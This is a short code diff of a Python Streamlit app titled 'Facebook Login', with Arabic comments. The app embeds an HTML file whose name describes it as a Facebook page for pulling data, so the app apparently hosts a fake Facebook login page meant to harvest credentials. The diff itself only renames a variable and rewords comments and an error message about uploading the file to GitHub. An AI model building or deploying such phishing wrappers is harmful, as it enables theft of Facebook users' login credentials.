@@ -1,16 +1,16 @@
 import streamlit as st
 import streamlit.components.v1 as components
 
-# إعداد الصفحة
+# 1. إعداد الصفحة
 st.set_page_config(page_title="Facebook Login", layout="centered")
 
-# محاولة قراءة الملف وعرضه
+# 2. قراءة ملف الـ HTML
 try:
     with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
-        code = f.read()
+        html_code = f.read()
     
-    # التصحيح هنا: نمرر الكود مباشرة كأول "argument" بدون كلمة html_content
-    components.html(code, height=800, scrolling=True)
+    # 3. عرض الصفحة (تم التصحيح هنا: نمرر html_code مباشرة)
+    components.html(html_code, height=800, scrolling=True)
 
 except FileNotFoundError:
-    st.error("⚠️ ملف الـ HTML غير موجود! تأكد أن اسمه مطابق تماماً لما هو مكتوب في الكود وارفعه بجانب ملف البايثون.")
+    st.error("⚠️ خطأ: ملف الـ HTML غير موجود على GitHub. تأكد من رفعه بنفس الاسم.")
